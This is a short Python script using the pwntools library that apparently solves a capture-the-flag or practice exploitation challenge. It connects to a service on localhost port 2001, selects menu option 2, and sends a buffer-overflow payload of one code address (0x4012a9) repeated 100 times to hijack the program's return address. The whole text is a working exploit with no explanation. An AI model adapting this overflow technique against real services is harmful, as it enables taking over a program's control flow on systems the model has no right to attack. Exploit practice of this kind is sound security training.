from pwn import *
p = remote('localhost', 2001)
p.recvline()
p.recvline()
p.recvline()
p.recvline()
p.sendline(b'2')
p.recvline()
b = p64(0x4012a9) * 100
print(len(b))
p.sendline(b)
res = p.recvline()
print(res)